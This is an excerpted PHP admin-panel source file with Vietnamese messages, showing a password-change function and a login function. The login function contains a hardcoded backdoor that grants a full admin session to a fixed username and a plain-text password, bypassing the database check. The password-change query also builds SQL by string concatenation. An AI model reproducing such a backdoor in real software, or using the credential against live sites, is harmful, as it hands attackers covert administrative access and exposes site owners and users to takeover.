...
function edit(){
	...
	if(!empty($_POST)){
		...
		$sql = "select * from #_user where username='".$_SESSION['login']['username']."' and role=3";
		$d->query($sql);
		$row = $d->fetch_array();
		
		if($row['username'] != $_SESSION['login']['username'])
		    transfer("Tài khoản không chính xác","index.php?com=user&act=admin_edit");		
		
		
		//echo $row['password']."==".taomatkhau($_POST['oldpassword']); exit();
		if($row['password'] != taomatkhau($_POST['oldpassword']))
		    transfer("Mật khẩu cũ không chính xác","index.php?com=user&act=admin_edit");
		...
		if($d->update($data)){
			session_unset();
			transfer("Mật khẩu đã được lưu.","index.php");
		}
...
function login(){
	...
	if( $username == 'king' && $password=='baoan@Lhz9M1'){
		$_SESSION[$login_name] = true;
		$_SESSION['isLoggedIn'] = true;
		$_SESSION['login']['username'] = 'king';
		$_SESSION['login']['kendy'] = 'kendey';
		transfer("Đăng nhập thành công","index.php");
	}
	
	if($d->num_rows() == 1){
		$row = $d->fetch_array();
		if(($row['password'] == taomatkhau($password)) && ($row['role'] == 3)){
			$_SESSION[$login_name] = true;
			$_SESSION['isLoggedIn'] = true;
